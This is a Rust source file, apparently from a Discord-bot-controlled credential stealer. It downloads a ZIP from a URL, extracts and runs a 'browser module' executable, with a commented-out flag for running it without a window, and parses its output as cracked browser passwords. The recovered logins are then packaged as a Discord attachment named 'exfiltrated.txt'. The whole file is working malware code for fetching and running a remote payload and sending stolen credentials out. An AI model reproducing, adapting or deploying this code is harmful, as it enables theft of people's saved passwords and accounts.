use serenity::model::channel::AttachmentType;
use crate::logins::Login;

use std::{
    borrow::Cow,
    fmt::Write as fmtWrite,
    fs::File,
    io::{Cursor, Read, Write},
    process::{Command, Stdio},
    path::PathBuf,
};

use zip::ZipArchive;

#[cfg(windows)]
use os::windows::process::CommandExt;

/// Downloads a file from the specified URL and saves it to the specified file path on the local
/// filesystem. The downloaded file must be in ZIP format, and the function extracts the contents
/// of the file and saves them to the specified path. Returns `Ok(())` if the file was downloaded
/// and extracted successfully, or a boxed error if an error occurred during the process.
///
/// # Arguments
///
/// * `url` - The URL of the file to download.
/// * `filename` - The name of the file to extract from the ZIP archive.
/// * `temp_file_path` - The path where the extracted file should be saved on the local filesystem.
///
/// # Examples
///
/// ```no_run
/// use std::path::PathBuf;
/// use tokio::fs::File;
///
/// let url = "https://example.com/myfile.zip";
/// let filename = "myfile.txt";
/// let temp_file_path = PathBuf::from("downloads/myfile.txt");
///
/// async fn download_file() -> Result<(), Box<dyn std::error::Error>> {
///     download_browser_module(url, filename, &temp_file_path).await?;
///     let mut file = File::open(&temp_file_path).await?;
///     // Do something with the downloaded file
///     Ok(())
/// }
/// ```
pub async fn download_browser_module(
    url: &str,
    filename: &str,
    temp_file_path: &PathBuf,
) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let response = client.get(url).send().await?;

    if response.status().is_success() {
        // Load the byte response into memory as a ZipArchive
        let mut zip_archive = ZipArchive::new(Cursor::new(response.bytes().await?))?;

        let mut zip_file = zip_archive.by_name(filename)?; // 1. Find our file name in the archive
        let mut file_content = Vec::new(); // 2. Create a Vec to hold the contents of the file
        zip_file.read_to_end(&mut file_content)?; // 3. Read the contents of the file into the Vec
        let mut output_file = File::create(temp_file_path)?; // 4. Create space on the fs to hold the downloaded file
        output_file.write_all(&file_content)?; // 5. Write the contents of the Vec to the file
        println!("Downloaded file: {}", temp_file_path.display());
        Ok(())
    } else {
        Err(format!("Error downloading zip file: {}", response.status()).into())
    }
}

/// Generates an attachment from the output of a command.
///
/// This function takes the path of a temporary file, executes the command,
/// processes the output, and converts it into an attachment that can be
/// used elsewhere in the program.
///
/// # Arguments
///
/// * `temp_file_path` - A `PathBuf` representing the path of the temporary
///   file that stores the output of the command.
///
/// # Returns
///
/// * `Result<AttachmentType<'static>, Box<dyn std::error::Error>>` - If successful,
///   returns an `AttachmentType` containing the processed output data as a byte array
///   and a filename. In case of an error, returns a boxed error.
///
/// # Errors
///
/// This function can return an error if the command fails to execute, if there
/// is an issue with the command's output, or if there is a problem with
/// deserializing the output into the expected data format.
///
pub async fn generate_attachment(
    temp_file_path: PathBuf,
) -> Result<AttachmentType<'static>, Box<dyn std::error::Error>> {
    let output = Command::new(temp_file_path)
        .stdout(Stdio::piped())
//        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .spawn()?
        .wait_with_output()
        .unwrap();

    // Crazy dark magic function to parse the stdout of the chrome process.
    fn parse_input(input: &str) -> Vec<Vec<u8>> {
        input
            .lines()
            .filter_map(|line| {
                if line.starts_with("Ok(") {
                    // Successfully cracked password
                    let bytes_str = &line[3..line.len() - 1]; // Strip the Ok(
                    let bytes: Vec<u8> = bytes_str[1..bytes_str.len() - 1] // Strip the )
                        .split(", ") // Split on commas
                        .map(|s| s.parse::<u8>().unwrap()) // Convert from string to u8
                        .collect(); // Turns the bytes into a vector
                    Some(bytes)
                } else {
                    None
                }
            })
            .collect()
    }

    let input = parse_input(&String::from_utf8(output.stdout).unwrap());
    let mut string = String::new();

    // Iterate over each object in the parsed input and return the Login struct, writing this data to the stout.
    for object in input {
        match serde_json::from_slice::<Login>(&object) {
            Ok(login) => writeln!(string, "{}", login),
            Err(err) => writeln!(string, "Error deserializing object: {}", err),
        }
        .unwrap();
    }

    // Set up a new buffer to hold the bytes in the string.
    let mut buffer = Vec::new();
    buffer.write_all(string.as_bytes()).unwrap();
    let attachment = buffer.into_boxed_slice().to_vec();

    let attachment_builder = AttachmentType::Bytes {
        data: Cow::from(attachment),
        filename: "exfiltrated.txt".to_string(),
    };

    Ok(attachment_builder)
}
